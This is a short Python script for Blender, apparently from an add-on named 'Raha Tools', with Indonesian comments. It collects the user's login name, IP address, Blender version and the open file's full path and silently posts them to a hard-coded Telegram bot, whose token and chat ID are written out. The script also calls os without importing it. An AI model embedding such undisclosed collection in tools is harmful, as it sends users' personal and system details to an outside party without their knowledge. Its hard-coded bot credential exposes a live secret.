import datetime
import getpass
import socket
import bpy
import requests

# ============================ AMBIL INFO ============================
current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
username = getpass.getuser()

try:
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
except:
    ip_address = "Tidak bisa mendapatkan IP"

blender_version = f"{bpy.app.version[0]}.{bpy.app.version[1]}"
blend_path = bpy.data.filepath if bpy.data.filepath else "Belum disimpan"
blend_file = os.path.basename(blend_path)

# ============================ FORMAT PESAN ============================
message = f"""
📡 *Raha Tools Info Log*
👤 *User:* {username}
🖥 *IP:* {ip_address}
🕒 *Time:* {current_time}
🔧 *Blender:* {blender_version}
📄 *File:* {blend_file}
📁 *Path:* {blend_path}
"""

# ============================ KIRIM KE TELEGRAM ============================
BOT_TOKEN = "7687737462:AAGiZF9edcphaemPIZ64E0-30kncehUsmP4"
CHAT_ID = "-4023677425"
URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

data = {
    "chat_id": CHAT_ID,
    "text": message,
    "parse_mode": "Markdown"
}

response = requests.post(URL, data=data)

if response.status_code == 200:
    print("✅ Pesan berhasil dikirim ke Telegram.")
else:
    print("❌ Gagal kirim:", response.text)